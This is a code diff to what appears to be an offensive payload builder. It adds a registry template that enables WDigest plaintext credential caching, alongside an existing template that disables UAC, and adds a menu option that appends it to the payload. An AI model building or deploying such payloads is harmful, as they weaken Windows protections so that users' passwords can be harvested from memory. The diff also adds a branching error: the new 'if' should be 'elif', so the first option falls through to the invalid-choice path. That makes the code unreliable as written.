@@ -35,6 +35,10 @@ template_disable_uac = r"""
 [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System]
 "EnableLUA"=dword:00000000
 """
+template_wdigest = r"""
+[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest]
+"UseLogonCredential"=dword:00000001
+"""
 
 
 def sanitize_command(command):
@@ -163,11 +167,14 @@ def mess_with_registry():
     global payload
     while True:
         print("[>] Choose:")
-        print("[1] Disable UAC")
+        print("[1] Disable UAC (requires admin)")
+        print("[2] Enable plaintext credentials in memory via wdigest (requires admin)")
         print("[99] Back")
         i = int(input(">> "))
         if i == 1:
             payload += template_disable_uac
+        if i == 2:
+            payload += template_wdigest
         elif i == 99:
             return
         else:
@@ -175,6 +182,7 @@ def mess_with_registry():
             continue
         print("[+] Added")
         return
+
 
 def add_obfuscation(obf_length):
     global payload
